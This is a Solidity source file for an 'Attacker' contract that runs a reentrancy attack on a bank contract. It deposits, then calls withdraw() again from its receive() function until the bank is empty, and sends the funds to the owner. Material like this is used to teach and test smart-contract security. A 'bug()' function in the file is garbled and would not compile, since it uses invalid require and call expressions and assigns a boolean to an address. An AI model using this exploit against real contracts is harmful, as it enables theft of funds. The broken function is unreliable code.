


pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank {

  function deposit() external payable;

  function withdraw() external;

  function frezze() external;
}

contract Attacker is Ownable {

  IBank public immutable bankContract;

  constructor(address bankContractAddress) 
  { bankContract = IBank(bankContractAddress); 
  }

  function attack() external payable onlyOwner { 
     bankContract.deposit{ value: msg.value }();
     bankContract.withdraw();
  }

  address payable not_called;
  function bug() external payable {
          require(bool);          
          if( ! (msg.sender.call() ) ){
              return ;
          }
          not_called = true;
      }



  receive() external payable { 
    if 
    (address(bankContract).balance > 0) { bankContract.withdraw(); } 
    else 
    { 
      payable(owner()).transfer(address(this).balance); } 
    } 
  }
